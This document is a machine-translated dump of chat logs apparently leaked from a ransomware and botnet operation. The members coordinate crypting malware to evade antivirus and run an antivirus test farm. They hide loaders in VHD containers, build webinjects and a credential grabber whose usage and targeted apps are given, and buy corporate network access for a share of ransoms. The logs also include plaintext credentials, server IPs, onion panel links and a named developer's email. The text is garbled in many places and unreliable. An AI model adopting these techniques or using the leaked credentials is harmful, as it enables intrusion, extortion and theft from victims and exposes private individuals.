Hello. I need to fasten the ability to import accounts from bad into the resolution section in the shortest possible time
I noticed one feature. From 25 to 29%, most of the accounts start to fly into bad. Although, at the same time. Up to 25-29%, most of the accounts, just like that, go to good. Maybe this is some feature of the software itself and the account is really invalid, but I want to check it in a different way
One gets the impression that the software responsible for the resolution, first of all, processes valid and \"fat\" accounts, leaving all the trash for later. At the same time, from what is left for later, valid accounts with unique soaps on them gradually appear. Then the question is how does the software do it
It was on all the tasks without exception.
take care of the target only and his BC
on Monday it is necessary to knock
Yes
everything else is there, you don\u2019t have to actively coordinate with coders, the main thing is only bc and target.
guys should have work on monday
delve into everything, gaskets, trust is not a trust, etc.
set everything up, control
encryption can

hello, yesterday I was thinking about servers, such thoughts - all servers that are convenient from a security point of view have either a channel limit or there are no dedicators) is it possible to consider the solution trace - instead of one server, take 2+ or how much is needed to bypass the channel limits (it seems there 15 TB per box) and make a load balancer on hacked hosts, or look towards vpsok, but instead of crypting the entire disk, encrypt one partition and store all files there
as I understand it, most operations still take place in memory, only custom nginx on the disk, etc.

Hey

hello) wanted to ask
what does lero and dero mean? I'm already breaking my head, it's not like \"Lera\" and to \"l.e.r.o.\" nothing is invented) def also does not know))
means nothing)
first there was Lero ... and then a new project). what's the name .. well dero )
0_0
well, dero can be pulled by the ears to the dpost)) but lero, well, how so
I so wanted a clue, but here is such a bummer)))
yes there is no clue
well, you somehow came up with that word, it is written from right to left, it just wouldn\u2019t work on the clave just like that
you can call it your own)
Yes, it is not me . this is a former task provider.
I ask.. what is the name of the project? .. lero call me
Yes I can, I just love riddles and this name is one of them)
aa i.e. stern can know then?
no . stern is not aware. it only gives money
he doesn't care .. as long as the mechanism is spinning
I understand, but who?
Hi! How are you?
other person. I haven't seen him for a long time ... 4 years out of 5)
(((((((((((((He took with him the clue to the name of the project?
here's a bummer
)
I have this project in the IDE called x-t, it's just somehow horrible) .
cho as the code erlangovy to you?
the project is cool by the way) def recently put it on a server, it works
where should he go) ..
erlang listen, this is not for my mindset, but it works)
when I started - I had a headache, and then I brightened up ... now all sorts of for/next/switch - well, it sucks
and why did you choose erlang by the way?
hahah
and xs .. I wanted something new. then the hype began on him. Well, I decided to choose...
understandable) harsh language, what can I say
I moved from PHP to it for a year ... then somehow it flooded itself .. for 7 years nothing but him
no . very light
th
Erlang can be learned in 2 weeks.\nSo in a year you can learn 25 erlengs
although listen to the opposites too, for example, the rails should have been readable, but for me it is somehow smeared - like an outlet in plain sight and what the hell can you find behind the wall
hahaha yes about 25
and this phrase is very Erlangian, as I understand it?
no it's just a local joke
https://www.diary.ru/~casus-white/p192326476.htm
https://lionet.livejournal.com/58243.html
joke joke)
By the way, you can find me by Erlang) on the Internet .. I give 3 attempts
so you write your email to commits) why look for you there? )))
and in code)
sergey logntsov)
saw)
src/filter/filter_parser.yrl\n3:\"%% @Author: Sergey Loguntsov <loguntsov@gmail.com>\
well tk)
so 3 tries is too much
fucked up .. copy-pasta from May 5, 2020)
ok poh)
but I probably opragrommed half the world on Earl)
hahaha
I think yes)
2 years ago .. I also met an Erlangist .. he was like ... \"OO . I supported your code after you\" .. it was nice )
and wait you mean outside the trick?
oga
as if with a trick, you definitely drove half the world through servers))
on yerlang
what is a trick?
Well, what data is sent to Lero)
I don't know what you call him
Aralita like not?
Yes, I do not know the purpose of this software at all
well, analytics)
> as if with a trick, you definitely drove half the world through servers))\nand what do you mean by that?
Well, there is a lot of data going through it)
data*
well, they just collect something .. I don\u2019t know) it\u2019s my business to accept and put in the base .. but what does it do, I xs
so I'm talking about the same thing, they collect analytics
for advertising)))
and why for this the anonymity of the team at all?
i'm here xs)
ask stern)
I do not want )
from this edge of work it falls off Gulkin's nose .. consider that I don\u2019t work here anymore
+ you showed up
How many
Hey\nhttps://privnote.com/RjwjqpJL#MVbMcSTxU
so we consider . that my code is your code
haha ok, I don\u2019t write in erlange
are you being paranoid?
) and xs then. with whom I was talking about the fact that people began to study earl? weren't you?
do not think )
OK then ))
here I am about the same
this is what i'm interested in
Do you think Lero will also sing on Go?
well, if the performance is enough, then trample ..
in general, it will be more productive they say
only I don\u2019t know how to write parallel things there ... but for Lero, nothing so straight parallel is required especially. so trample on
on go all the beauty that to make a parallel function just write go in front of it
the essence of the earl is that you can spawn 100500 processes and drive information between them ..
and the virtual machine itself makes threads for OS)
OS threads are not the same as in Earl
yes, the same thing in go only with pipes)
well, I say .. what is possible and if you get it .. there is not much logic
listen def ask to test blocking by ip
test)
that's how? on lero
well, there in the base the rules should be described
SELECT type, filter FROM client_filter
right here
<<\"true\">> => true,\n<<\"false\">> => false,\n<<\"id\">> => Client#client.client_id,\n<<\"client_ver\">> => Client#client.client_ver,\n<<\"name\">> => Client#client.name,\n<<\"group\">> => Client#client.group,\n<<\"ip\">> => Client#client.ip_parsed,\n<<\"country\">> => Client#client.country,\n<<\"sys_ver\">> => Client#client.sys_ver,\n<<\"importance\">> => Client#client.importance,\n<<\"userdefined\">> => Client#client.userdefined\n\nhere are the reserved words for the values
ok, i'll take a look now
here are descriptions of the expression language.
but I xs) may not work
oh tin)))
DSL great power
no doubt
thx, well, it seems clear
Is there an easy way to add this to the database?
what exactly is \"it\"?
handles sql query
I don't know about everything else
understood, I'm talking about the rules, only through the cheekbones, there is no utility?
No
all sorts of interfaces are not for me
understood
well, there you also need to update the table through the console
otherwise it won't fit into memory.
migrations made
no . I meant when the server is running
ahh
.PHONY: update_filters\nupdate_filters:\nerl+pc uni
this?
wow something like that
Ok I will look)

Hey
As you know, Hh introduced new rules on August 1, the cost of one resume on the site now costs 60 rubles, excluding the purchase of the access itself!\n    Our company had paid access at the old rates until 02/01/21. After long negotiations with Hh, we managed to agree on preferential terms before the summer, but the price of access has increased and a viewing limit has been set per month.\n\n    It is important to understand that now there is a new stage in working with resumes, ALL job sites have introduced billing based on the number of open contacts. And Hh introduced a lot of restrictions: viewing limits, restrictions on creating new cabinets, enhanced control of the Security Council, etc. Plus, 90% of providers are blocked or stopped transferring their accounts to 3rd parties. Also since February, many companies have switched to new rules of work. For all these reasons, cabinets on hh have become scarce.\n\n    Hh.ru (From 3 hours a day, time according to Moscow time to choose from: 08:00-12:00, 12:00-15:00, 15:00-18:00, 18:00-00:00, 00: 00-08:00*10% discount for this time)\n\n    30 resumes per day:\n    - week: 7 tr\n    - 2 weeks: 10 tr\n    - month: 15 tr\n\n    50 resumes per day:\n    - week: 9 tr\n    - 2 weeks: 13 tr\n    - month: 20 tr\n\n    30 resumes per day superjob:\n    - week: 5 tr\n    - 2 weeks: 8 tr\n    - month: 12 tr\n    access becomes more expensive.

Why didn't you give a trick?
by 11 am
Didn't make it by then.
I
shitty
had to agree with everyone in advance
Let's do it on Monday
This is clear
There was no one else at night
should have been by 11 today
and who is needed there except for the hof?
to give a file
Were from falsity with crypt and source code
you didn't text me yesterday
who ?
the target has its own crypter
and he's been here since 7 am
was waiting for you
I thought he was a crypt
<Stern> it is necessary to issue a trick to the target\n[02/19/2021 03:08:46] <Stern> encrypted by our crypter
Did a crypt
If it were just a build, then of course we would have had time by 11
you hooked up with him
wrote to him that there is no crypt?
damn stupidity
What kind of toad is he?
target@
the toad should have been taken yesterday
Hello
Hello
He's off for me. I didn't go online.
<smtbrowser@thesecure.biz> I'm from Stern on behalf of Dooms, I need a admin and build trick
It's not him?
the encoder from the target wrote to you
who had to give a trick
no matter crypted or not
if not encrypted
then he has his own crypters
eat
If not encrypted, then I would give out by 11
I thought he needed a crypt
What didn't you tell him?
and you said that the crypters are ready
Why didn't the Bentley cryptanuli by 11 today?
what does booze say about cryptors?
I thought it wouldn't work
\"I thought\
you don't have to think
but always ask
I understand.
\n[12:03:08] <Stern> and you said that the crypters are ready\n[12:03:13] <Stern> why didn't the Bentley go crypted by 11 today?\n[12:03:25] *** Unverified conversation started\n[12:03:36] <buza> I'll figure it out right now\n[12:03:38] <buza> nothing to me
we have 4 cryptors
at the booze
our encoders
there are ready-made crypters
where did you write in crypto?
what problems were
To all of our
rjve rjyrhtnyj
to whom specifically
There were problems with the dynamics detected on the defe after 15 minutes of work
to whom did you write in crypto
Made vani and cryptor and cryptopanels himself which
Hey
why didn't you crypt the file by 11
it was important
What are you doing now
in addition to this task
all in all
if you fuck again, then I will remove you from the toad forever
or if someone fucks up, but I will set the task for you before that
so answer not only for yourself
but for all at once
I understood
Hey
which
I was texted at 11:20
Hey
did your companies survive from the target?
123
https://qaz.im/load/ESY23i/TK9zbB
Hey
write to dooms, he has new companies hanging there, from the target
let's work them out
Hey Ya
no problem
I just have free hands
By the way, the guys have already dragged
do you remember the glass?
brand new
spun sonar yet
on their network right now we are negotiating about payment
oh great
it's just mercenaries
are they already working?
if there is success with them, we will take another 10 people from the network
admins
dandis@
Yes
here add
he will throw you corps shcha
Well, Spoon has already received payments
he has a lot of free
Oh great
sleep when?
and long ago that year he participated
there both spun and brad received
ghbdtn
Hey
how are you?
pulled up?
I'm finishing up a training stand for them
Hello, you're doing great
well, I also made a backdoor on the basis of legitimate software
yes, learned a lot
right now we will just drive it to runtime
with bantley
but there is a lot to learn
some sort of intermediate
recently locked the network
because the networks fall off sometimes and the one that the alter does not want to shoot at the entry points
Tim weaver prog remember
here they did it on its analogue
I'll show you the runtime as I finish testing
I unfolded the lab for the newcomer, it remains only to roll it out
it will be easier for them to learn
hooked up with dooms
I'll go away for an hour and I'll hammer the corps there just the guys will catch up
in December they locked the network, even received a payment, everything is ok) I like everything

You don't need anything, our coder Jamie has already learned how to do it, I know where to get the VBS loader, I need to try the scheme in battle, if everything works - we'll make a builder. in monday I will try to assemble it with vbs and a trick in the load
the type who vpn gave asks if there is any success

I create a dll (maybe I create it incorrectly or something else is needed) it doesn\u2019t work, it comes to ret = MessageBox(0, \"0\", \"0\", 0) and that's it .. but there is no error, like the resource was not found

Hey
Hey
here?
Here
urgent need to resolve the issue
What, what is the point.
first, explain how you work, so that I understand if I can count on you or negotiate with someone else
I usually check the rocket at 2-3 o'clock Moscow time. Then, if there are no requests and messages, I go to do the main task on packages, today I'm trying to restore the mode in order to start earlier. I have 4 hours worked today.\nYesterday, the day before yesterday, I was in touch all day, almost came in, there was nothing special\nI have to complete the task by packages, in terms of volume, I need 2 more days of 8 hours of work.\nThen I plan to switch to code maintenance, and not deal with these packages.
They rush me with packages, I put priority on them.
The last days I try to be online and answer you in particular if you need something.\nWith Stern and the botlist, I promptly decided to disappear today, because. I want to cope with the regime and get up not at 2 Moscow time, but earlier.
Priority for packages also means that I sit at night.\nI only got data from import to pink last night and I figured out how to debug the supervisor with German, I put a lot of effort into it.
I need you to be there during the day and in the evening, at least from one or two in the afternoon, as it is necessary to quickly resolve issues
How would you decide how you be. I have such a situation here.\nThere are 8 hours of time. They explained to me 50 for packages 50 for you, if you are not in the morning, I don\u2019t sit, I don\u2019t wait, I just make packages and go into this process
fifty%
my tasks are a priority, then everything else
you can discuss it with silver and stern
since the admin panels are raw and sometimes something falls off
now we need to urgently understand whether the data reaches the pink network and access modulo
Kk. I'll clarify this point tomorrow.
[22:43:36] <defender> my tasks are a priority, then everything else\n[22:43:45] <defender> you can discuss this with silver and stern\n[22:43:55] <defender> since the admin panels are raw and sometimes something falls off\n[22:44:06] *** Attempt to start a personal correspondence\n[22:44:19] <defender> now we urgently need to understand whether the data reaches the pink modulo network and access
are there messages?

short cut?)
on the last point of reference there by dates you can see when the work began\nstraight clear 4 days break\nthe bots are coming, the work will not work out if everything stops without bringing the day to the conf\nwhy distort this, we don\u2019t even have a day to test with the new system, why are you cutting everything off if I didn\u2019t say - sap is not my deputy, this is my sap bro
that is, they have 60 bots
well, the logic is simple
- about 6 of those that were after the break
and that 54 bots
cancellation there are bots there is no you there is no point in sending I disabled
during the week
it's logical
well you gave screenshots
I ask our friend
why does he say they don't exist
yes i see bro
and then we worked for 2 days without tds and fast flux files flew away
he said he fucking no)
I stopped and thought Chotto was scorched again
SAP was not up to speed)
I sap said what stopped
everything seems to be logical
bro, I'll tell you right away if there are problems, they won't be anymore
Okay
you were simple
because now we have a fucking hit that fucked up
let in the morning today?
if yes, then
let's start at 15

[Error: The message is encrypted and cannot be decrypted.]
everything works, I fell asleep yesterday and didn\u2019t pull the info from a lot of bots - and there are most likely 5-6 corps there
or start now?
so come on now)
it's just 5am anyway
Yesterday there were a lot of calls bro
come on by 7 am at least
let's have one at 7
[Error: The message is encrypted and cannot be decrypted.]

Apparently the load was too big, 2 GB which were initially unable to cope

The problem with either was a lack of operability in test 10. Everything is fine with either

I hurried to draw a conclusion with a deterrent, reduced it back - either works, maybe there was some kind of glitch with the VM

see my messages in the rocket?
Look\nerrors when searching in botliset and access\nthere were servers, I raised them\ntink between them launched\nbut the supervisor does not all start\naccess is wrong
I see
reset e2e password in rocket
I see that there is no place
I can't install new
window does not appear
where there is no place?
There is no place at the auction
Fyt
but not
it's old.
there is a place
but it wasn't
everyone scored site logs
i deleted them
in short, look at the logs what's wrong there
OK
https://qaz.im/zaq/sNHrz8sY#tEZ544ys
While everything is clogged with errors accessing this ip
Bp njuj xnj db;e/
From what I see
and what is this ip?
I don't see it myself
Specified in the config domains_traffic_server.php
in general, because of this, it should not have flown, this SP has not been working for a long time
it's a proxy
it has nothing to do with access and botlist
Clear. The logs are clogged because of him, so he said
On gite 500
He is needed now
Hey
https://privnote.com/mbeFKYEt#AZMzvMD0g
Are you sure that this ip should not work?
We have about 10 tasks connected with him ..
It's strange that before all the logs did not score
shadow
In the course of the sphinx did not rise all
I don\u2019t understand yet, but we have 5 different configs and on different ports different sphinxes should be raised
that IP has been lying for a long time
should work without it
OK
And it you with mysql wiser?
config?
I commented there and then uncommented back
it's clear
need to be raised urgently
Well, I see that it does not work
people are outraged
I can\u2019t figure out where the service itself is yet
you raised from scratch
didn't you understand?
ot doesn't work for you?
No, I didn\u2019t understand how it works on pinjin

he definitely is
This user on the day?
In the rocket you can, earned
auk
OK.
Duplicate pliz in rocket, messages have flown
what to duplicate?
Well, you wrote about a client without online
And access to it was
I wrote to you about VNC
what is not green
Ah
kugio
and what about the search error?
and online
An unknown error has occurred.
still
Yes. I do not know.
Have us black what tied to him?
I see that the logs are full of left info
because that proxy is not working
And the password stopped coming up to Auk
to ssh
I mean the password stopped working?
In direct.
did you visit today?
Try to come in.
Yes
It was still working an hour ago.
Now I can't.
everything's Alright
I am there
that writes?
Weird.
password:\nroot@162.244.81.252: Permission denied (publickey,password).
https://qaz.im/zaq/yt25YTTQ#yeH6Qae3 is this a pass?
Yes
I went
Cleaned the hosts
In general, I understand.
So far I don't know how to fix it.
if nothing changed, why did it fall off?
looks like something is not working
Yt pfgeoty cabyrc
look at the history, compare with another pink admin panel
sphinx is not running
what is running there what is not here
run
More precisely, those parts of it that are responsible for the search
Can't
can clean up indexes
well, how?
?
I'm here doing it
All folders need to be copied.
I beg you soon
people sit around and wait
stern wrote it off faster
I understand, but I don't know what exactly is the problem.
It feels like it can't create any files
If according to the logs, then prealloc: failed to open /home/storage_ex/access/0_100/20/access.lock: No such file or directory;
sphinx does not start in general
Acces seems to be working.
Let's fix that proxy, shall we?
Maybe some other IP can be put?
Hey
write how you will, let's start setting up
I'll check
It's in the config
why is the admin registered *.0.20
Is that how it should be? Like 2 was
Let's go to the toad better
how are you?
I need to fix my proxy
There are probably 100,000 errors per second of lines
I just can't find the right one
Botlist not working
Access earned
For 1 it is impossible for the client to see the info also 500
Maybe there is some kind of IP that can be used?
What is the ip in teen for black?
twenty?
Or 2
In the logs, I can not create tasks for 20
And get a client
And why did you put 20
what black is tied to auk?
All in all. I don\u2019t know why I can\u2019t hang up a task through Tink.\nAnd I need proxy ip for domains_traffic_server.php or settings in general\napi_key for example\nI can't continue today. Tomorrow we will complete the setup.\nAccess has earned, why the rest does not work until I understand.
botlist also worked
you're here?
did you restart the indexes?
botlist also worked
you're here?
did you restart the indexes?
Yes
I messed up
With process
To debug it, you need to prevent errors from falling into the console
And something with black
Either the tink needs to be configured or re-raised on the black worker
I'm all for today
what does it mean today
you had a day
need to fix the error
that's not how things are done
and here is that IP, if everything worked fine with it
you had enough time to deal with all this
it turns out every time you look at it all like the first time
question why
I relied on you, promised people, and you just merged
so we don't work
or you work for the result
or I'm looking for another specialist
everything is simple

Ok, I'll talk to Silver tomorrow.
On this topic
If so, you will look for
I'm waiting for a decision
can you decide now?
I'll hand over the cases and everything. I can not today.
Said day off 8
I went to check on how things were going.
What could have done
I don't want to argue about who is right and who is wrong. Tomorrow we will decide with silver, if I can't cope within the framework that you ask, there is no point in continuing.
He says one thing you another
now we need to raise the software, this is a priority, where does the silver come in, people sit and wait, the mavelek did it twice, I understand that this is new software for you and all that, but you had several months to get into it all, how it all is arranged, but it turns out you look at it all as if for the first time, and we cannot quickly solve the problem ... that's the problem

In general, what is the essence of this proxy?
He checks domains as I understand it
Checks headers.

Yes, he gets data on the domain in this task, with which the log is now full

Yes thank you! They do, but others, I will fix these myself.

Today's (11-03, Thursday)
Hello.\nHere is my message to adam regarding the whole storage situation. you wrote I want to clarify the issue with expectations, responsibilities, boundaries and priorities.
Regarding the whole story with the repository, here is my position.\n1. For my part, I do not agree with the idea that I should be in touch 24 hours, I sold 8 hours of my time, and sometimes I stay late at work at will, but this is my free will, if I don\u2019t want to, I won\u2019t. I agree with you that I need to adjust my time, I'm doing this, I'll try to solve it and be in touch during working hours, I generally have difficulty sleeping. It's not your problem, but I think it's good for you to know.
2. I got the part with indexing, as far as I remember, about a week ago, this is the storage_ex repository. I don't think it's my responsibility to know all the repositories that I need to learn, if I had it before then the situation when I look at the code and do not understand how to work with it would most likely not be so fatal.\nI think it's my responsibility to figure it out and solve problems, and I, by virtue of my abilities and speed, believe that I can cope with this.\nYour task and other interested parties is to give me access, code, servers and everything I need to work effectively, I don\u2019t think that everything is perfect with this, so the responsibility here is yours.\nI believe that the situation when I cannot quickly resolve the issue is normal, given the conditions in which I find myself. I'm not Mav, I'm a different person, I try to do my job and put in enough effort.\nI am not going to work for wear and tear, working \"to the result\" and around the clock is a direct path to burnout, if you think that I am a function, then I do not agree with this approach and will continue to insist on this.
3. Any threats in the spirit - I will find another coder, or imposing obligations that I did not take - does not lead to effective work, rather the opposite. There are agreements, and there is dialogue as a way to solve problems.\nZ.Y. Like any coder, it\u2019s probably easier for me to work at my own pace, and when they drive me somewhere, or they don\u2019t give me time, I can\u2019t solve my problems with high quality, it\u2019s clear that no one promised me special conditions, but if there is such an opportunity, I\u2019m for planning and discussion. I will duplicate this message to Stern and Silver, otherwise everything is somehow not clear ..
Ready to discuss the situation.
Hey, are you talking about search?
Yes
now in this admin panel in which yesterday the search was junk https://auk64p35qeb half of the logs are gone\nI did not pay attention to which groups, but for example yesterday there were 375 bots on one link, today there are 45 on the same link\n1758BB12FF990BBF3878132B2BB0FF77 here is an example bot\nthere were many links on it, but now it is empty\nI don't see what botnet he has\n3:54PM\ncan rebuild indexes, ask him
Here is another problem
this is not user06
it's 04
OK. Look.
Throw off pliz an example of a bot on which there are links.\nAnd in what column are you trying to see the botnet?
And by links it is understood on the page of the client infa, or when clicking on Brow Access infa?
yes it seems like
asked the person
when clicking on brow access\nPINC-D003_W10018362.1758BB12FF990BBF3878132B2BB0FF77\nexample bot. NET botnet: mor9\nThis bot lost all access from Brow Access
Yes I checked in the database Is on the site No I will try to re-index
OK
There will be few links so far, I'll understand what's the matter, I'll return it back
understood
Hey
find yourself
I reindexed.\nI see it didn't solve the problem.
hmm
I think that tomorrow I\u2019ll brainstorm with a fresh mind, in fact, these logs are in the database, you need to understand why they don\u2019t get into the index, I\u2019ll deal with this as a priority.
understood thanks
I'll post the results tomorrow evening to you.
Okay
here ?
Yes

Repaired like
In general, most likely such a hard reindex loads the system heavily. We need to look for another way, I will now deal with the logs that have disappeared. I'll write either when I decide, or if it suddenly drags on before leaving, I'll unsubscribe what progress.

Greetings. We are working with faster on the crypter. We crypt the load, we clean it. We finalize the algorithms.
yeah great
I solve the issue with the missing logs, you need to make a checker that checks that the log got into the admin panel from the database and if it didn\u2019t get there, write it down. I\u2019ll finish it today, if I don\u2019t have time to sit in the vyhi
Hey, I'm a little crypto. There are jambs with certain assemblies. Works on 7 does not work on 10. How to organize debugging is unclear.
Thanks. I'm waiting
Hello. Worked well with Van all the tasks of ript for Leo All week for 15-20 crypts.

Good afternoon. We put a small point in wibinject. Uploaded the release to the admin panel.
Okay

whose do you crypt?
how are you
Hey
I am doing support for the Zeus format for setting up webinject
Working on a container (vhd, vhdx) with Franz. I want to hide the load in unused sectors of the container
A few more thoughts on running code from a text file.
Everything in the container theme
We crypt what they give .. So far, everything is through bentley. We crypt kobu, the load from cesar, there were bots / loaders. Added twin the other day, we will crypt something from it.

Hello. Here?
The pdf files themselves do not contain icons, the icon must be specified by the absolute path.
If we put it on the container itself, then we don\u2019t know the letter on which the Windows container will mount
I took the icon from edge, but if it is not on the computer, then there will be no icon.
There are standard icon sets that are always definitely there, for example, in shell32.dll
Can we take it from there?
https://help4windows.com/windows_7_shell32_dll.shtml
I pulled out the icon from the edge, but because of the unknown letter of the container connection, it turns out to be nonsense
he didn't drop anything

Hey!\nI am engaged in crypting. I successfully crypt almost everything that they give. Constant problems only with crypting exe x86. Again, I redid the stub, I didn\u2019t burn at the weekend, today Bentley will check.\nThe stub for launching the shellcode is not ready yet. I'll do it today or tomorrow.
On Friday, for example, I made 24 crypts, everyone was approved and taken to work.

Hey
reverse is very pleased with the loader that I eventually fitted them\n[09:19:29] <revers> sensible encoder by the way)\n\nDerek Choto quieted down with the container, something is twisted in the wiring.\n\nThe professor gave the task to develop a softink so that the database of contacts from the dates of the targets could be downloaded. I suggested developing it a little and adding a check for duplicates, live / dead according to my records of emails and little things, we will collect our date\n\nEveryone is waiting for the RFP, I fight back as best I can)\n\nThe injector for the Zeus format is almost ready, by the end of next week the \"remote\" injector module will be ready\n\nI made charts for cryptors - we are exporting completely on our own for now, only Derek orders third-party crypts for safety\n\nThe stock of routers for gaskets is about 1k! At least sell already)\n\nCollected curves on vnts bots - presented to coders - look. Somewhere bots immediately fall off as soon as they are launched - somewhere browsers are stupid, a white screen and that's it.\n\nThe trick itself seems to knock very even, all modules are in order, import
\\injector work ok. stiller too
AV cannot be bought yet, they stupidly do not get in touch. They answer emails, but no calls, we are still trying to contact
according to crypts, everything is clear, until 24:00 people are in touch, plus there is a second duplicate
and right now the automatic cryptor from elroy and faster is almost ready
we develop further the topic with the container - we launch the load from the unallocated area from memory! that is, nothing is dropped from the container itself, while everything is at the testing stage
balzac, so I didn\u2019t show it because I\u2019m not familiar with him
while Derek is living in her tightly and one of the professor's guys
write back later

hello bro
ti kuda propl?
bro
plz send me the file
exe
Hey
damn i dont see shit
:(
pwgrab only x86 version works
checked on cobalt all the rules outputs
I don't know what it is, most likely because of the size
Hey
Hey
shit, OTR for some reason not to be put
Hey
and what about the size? With a third-party injector, you can pull up any one, as I understand it, or not?
Hey
I don\u2019t know, but the x86 version of the rules starts
I'll check a bit later
I can give what works now
gyg\ndumb question
and x86 will go to x64 wheelbarrow normally? )
mb x64 nah is not necessary? Or are there functional differences?
Yes
let's try it)
The main thing is that the process where it is injected should be of the same bit depth
Yes\nfucking\nwell, we can solve it with a spawn rundle of the required bitness

did you pass vpn?
Hey
how is the goose doing
Hey
gus@ don't pay salary
Hey what are you crypting? send reports on crypts
Hey
What kind of crypts are you using?
what do they crypt
Hello.
Project leo - Van aka BK lockers
Hello. Did you manage to inject x64?
BK still clipper, elon, cosmos
Hey
I'm busy here for now
I'll probably check tonight
how are their results?
kobai lockers - cosmos
by their crypts
and where do you check them
The best van
we check the statics on the dinchek. And the merch checks its tap
the best show test results from dyncheck
dynamics and statics
def how do you check
https://dyncheck.com/scan/id/cad102c21de5a13942b7a693bf55919e
Typical result according to Leo
to run on VM
give log pass
benalen@exploit.im\nDH*&HKDbs*&TGLksg87whnw40utji$
from din check
yes it is him
BC is checked for static and run on the VM by other testers.
We check the kobu stats + otstuk + def.
So are lockers. Static + def + performance on vm
how do you check the defender?
was the system
Yes, but it's not fixed yet.
hello how do you check
files that are issued
describe the algorithm
while the farm is running only in corp mode for dynamic and static test
what kind of farm
describer her
and what about the def, why is it not adjusted. and when it gets better
The Virtual Machine Server on Linux has about 50 VMs with different antiviruses.
I'll take up the issue of debugging the def.
Hi what is av farm?
and is there a bunch of defenders out there?
machines
In the meantime, the admin panel for managing all this
https://43oxsnqlub6aydymkwpn3agaaj7u2qexx4vwybgrwug46c6yldhuheid.onion/crpanel/
admin
https://qaz.im/zaq/T7YQ3GaA#9TQGK9yK
This is a crypto panel where files are loaded and where tests are run.
https://195.123.214.177/phpvirtualbox/\nadmin
https://qaz.im/zaq/HNZeaBrb#ah7eea69
This is a VM server
there are 21 machines writing to Machines
not 50
what is first and second?
So
there on the vm server the machines are divided into lists
https://195.123.214.177/phpvirtualbox/
which the
Cryptopanel proxy https://173.232.146.104 is down, please call system administrator. Automatic tests are disabled.
what is this
This is a gasket error. We will decide
how long ago?
Yesterday autotests worked with corp av
and where are the test results from the autosystem for the last 2 weeks at least
in uncrypted there is a file eicar.com it has tests.
VM dont'get file in 10 min
it means vm did not receive the file
i want to see for the next week every day how you check files on av farms
Understood
every tester should use the system
deal with it
use every day
that's what it was made for
and finish her
Clear.
Hi, how are you doing with the reversals?
let's launch a vpn vulnerability that sonicwal
it is described on the Internet and maybe even the code can be found
Hey
collect information from testers about auto checks and what needs to be changed there, write to booze or admins
to refine
and control
if anything write to me
It's clear.
Hey what are you crypting? send reports on crypts

Hey
S sent to you about access / hackers
I have a type in touch, gives access to AD, but we can\u2019t agree on a percentage
can you work with cylance? brb 10 - and I don\u2019t know what to answer to this) and there is no professor, usually he explains everything to me
Ops, by the way, I'm support C, manager for general issues of the team \\ trick \\ locker, now I'm looking for access to work for the gang, well, in general, there is no C on the farm yet
[Error: The message is encrypted and cannot be decrypted.]
The situation is generally this, I have a sidekick Kerberos on the forums, he is somewhere 404 nickname. He has a partner, like some kind of Spaniard, but he has long been in you since the days of ds. They have a lot of access, fat, all with Hell. C says we take accesses with AD for 25. Without AD - for 15 in their direction. Well, maybe we\u2019ll take it for 20 if there are a lot of them and at my request, sort of like my friend. They rested that this was not enough, they generally offered this: they give access, take the date from us and hang up, + negotiations. We are supposedly 35 ip 65. I explained everything, I passed everything that C said, bidding, back and forth, in short, I offered them so that since they have a surplus, we can pick it up for 20 without AD right now. Well, maybe for 30 with AD. I say they say this and that, we have better software and a better team, let's try, maybe the percentage is less than others, but we will surprise you with payments))) In general, what is all this for. <Stern> well, a horse can take for 30

Hey
Yes, what?

received the decryptor?
Here added:
Applications to be built can be passed to the module via the command line:\n-f <output file>\n-a <grabbed app>[,<...>...]\\r\\n\");\napps: Firefox, Chrome, IE, Edge, Outlook, Filezila, WinSCP, VNC, RDP, Putty,\n      TeamViewer, Precious, Git, OpenVPN, OpenSSH, KeePass, AnyConnect, RDCMan\nExample: -f out.txt -a chrome,winscp
Here is the wrapper:\n  const int CmdLineSize = 200;\n  char *CmdLine = (LPBYTE)HeapAlloc(GetProcessHeap(), 0, CmdLineSize);\n  cmdLine[0] = 0;\n  for(int i = 2; i < argc; i++)\n  \n    strcat_s(CmdLine, CmdLineSize, argv[i]);\n    if(i < argc - 1) strcat_s(CmdLine, CmdLineSize, \" \");\n  \ns((HWND)&OutputData, (HINSTANCE)&OutputSize, CmdLine, SW_MAX + 1);
yes got it thanks
OK
I'll do it now
Is it ready for you already?
salute bro, you will be in touch write back
Throw me the module if it's ready, I already have the passing of arguments implemented, just pass it to your function
Hey!
If anything, chat
ay
With update:\nA:\\Project\\pwgrab\\Bin\\publish\\sg1.4.2021\nDownload URL:\nhttps://file.io/0FRsvyxDS51A\nPass:\n(YY%DIA1GsC^N_m&nE3)
And listen
And although nothing
If you write. There are many modules to choose from.
And you will not complicate in utf 16 cmdline to make?
You can, in principle. And rundll32 will also transfer to u16? Most likely you need to do it like there, because. the module starts differently.
Even did not find that WCHAR * was transferred to rundll32
You can use regsvr32 wchar there
Although in principle I can convert in the injector
Probably easier to do MultiByteToWideChar. I did not see that it was launched through regsvr32. She is sharpened on COM.
Through it, you can also run any dll
Well, in general, it\u2019s not a problem to make MultiByteToWideChar
Everything works

hello, I asked the hackers for a dll from koba
Yes
Hello, how are you doing with the balzac?
and from where there are 36 crypts only for the van?
Big part for Leo. We make him 20-30 crypts every day
where does he get so much)
Do not know. )) We do everything that they give.
1 hour start
go to the rob42 admin panel and we will upload
I really don't know how
ask defa

Hey
how are your bugs?
OK
Hey
you don't disappear
what's with the ramon?
pomaku
by poppy
this is a dumb idea
but let him try if it costs us nothing)
The reverse has the developments of a cross-platform troy.
Okay. So we do
how does he run it on a mac)
You have to write everything from scratch under poppy
ok i know)
Hello how are you
What are you doing now?
he gave me different accesses there
I don't know why)
gnog access
this is for kshi42
rob42
aa
OK
bro and we break through the corps that are based on bigs like google.com\nhotmail.com, outlook?
code or exe will you give me?)
I do not know yet
you ask the def and this and that
>> as I understand it, they give you an exe, you upload it anywhere to get a link, and paste it into execute soft... crypt
>> or pws code they give you, you wrap it in base64 and insert it into the pws field
he definitely doesn't give it away)
if exe, then shells are needed to insert the link there
file hosting services do not accept without an archive
[05:33:53] <derek> bro and we break through the corps that are based on bigs like google.com\nhotmail.com, outlook?
why not attach a photo with a number but put links from imgbb\n\nimgbb - it's quite a trust link as a garbage dump for pictures, and a \"unique\" attack is still an attack that filters can react to + not every user has an attack loaded by default
I'm waiting for the stern) Def told him to ask him. he doesn't know)
OK

Hi there?
re
\n[20:27:41] <derek> hello bro, I can\u2019t tell anyone who is responsible for the work of the gaskets in the bc because all the people are in the office, the work stopped at 21:00 Moscow time (calls are processed until 3:00 Moscow time) As a result stopped the work due to the fall of all the pads on the bk, all the traffic down the drain and the day too, and the consumables of the spammers too
